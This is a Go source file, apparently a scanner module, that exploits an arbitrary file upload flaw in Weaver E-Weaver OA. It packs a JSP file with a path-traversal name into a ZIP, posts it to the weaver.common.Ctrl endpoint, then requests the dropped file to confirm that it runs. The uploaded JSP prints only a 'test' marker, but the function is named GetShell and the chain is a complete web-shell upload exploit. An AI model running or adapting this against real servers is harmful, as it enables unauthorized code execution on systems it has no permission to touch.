package ecology_Weaver_fileupload

import (
	"archive/zip"
	"bytes"
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"math/rand"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func generateRandomStr(randomLength int) string {
	const baseStr = "ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789"
	rand.Seed(time.Now().UnixNano())
	var randomStr bytes.Buffer
	for i := 0; i < randomLength; i++ {
		randomStr.WriteByte(baseStr[rand.Intn(len(baseStr))])
	}
	return randomStr.String()
}

func fileZip(filename, shellContent string) (*bytes.Buffer, error) {
	buf := new(bytes.Buffer)
	zw := zip.NewWriter(buf)
	f, err := zw.Create(filename)
	if err != nil {
		return nil, err
	}
	_, err = f.Write([]byte(shellContent))
	if err != nil {
		return nil, err
	}
	err = zw.Close()
	if err != nil {
		return nil, err
	}
	return buf, nil
}

func GetShell(url string) bool {
	mm := generateRandomStr(8)
	webshellName := mm + ".jsp"
	webshellPath := "../../../" + webshellName
	shellContent := "<%out.print(\"test\");%>"

	zipBuffer, err := fileZip(webshellPath, shellContent)
	if err != nil {
		color.Red.Println("创建ZIP文件失败: ")
		return false
	}

	uploadURL := url + "/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).
		SetFileReader("file1", mm+".zip", zipBuffer).
		Post(uploadURL)

	if err != nil || !resp.IsSuccess() {
		return false
	}

	getShellURL := url + "/cloudstore/" + webshellName
	checkResp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).
		Get(getShellURL)

	return err == nil && checkResp.StatusCode == 200 && strings.Contains(checkResp.String(), "test")
}

func Run(url string) {
	if GetShell(url) {
		color.Green.Println("[+20] 泛微OA E-Weaver weaver.common.Ctrl 任意文件上传漏洞存在 -> ", url)
	} else {
		color.Red.Println("[-20] 泛微OA E-Weaver weaver.common.Ctrl 任意文件上传漏洞不存在")
	}
}
